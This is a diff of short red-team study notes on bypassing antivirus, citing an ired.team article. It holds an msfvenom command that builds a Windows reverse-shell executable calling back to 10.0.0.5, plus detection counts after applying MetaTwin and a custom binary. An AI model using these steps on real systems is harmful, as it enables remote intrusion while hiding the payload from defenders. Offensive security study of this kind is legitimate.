@@ -50,6 +50,15 @@ https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasplo
 generating a reverse shell payload
 1. msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
 
-initial detection 51
+-initial detection 51
 
-install metatwin and check
+-install metatwin and check
+
+with metatwin the detection
+detection come down to 41
+
+- uploading custom binary 18 detections
+
+with metatwin we have 7 detection.
+
+
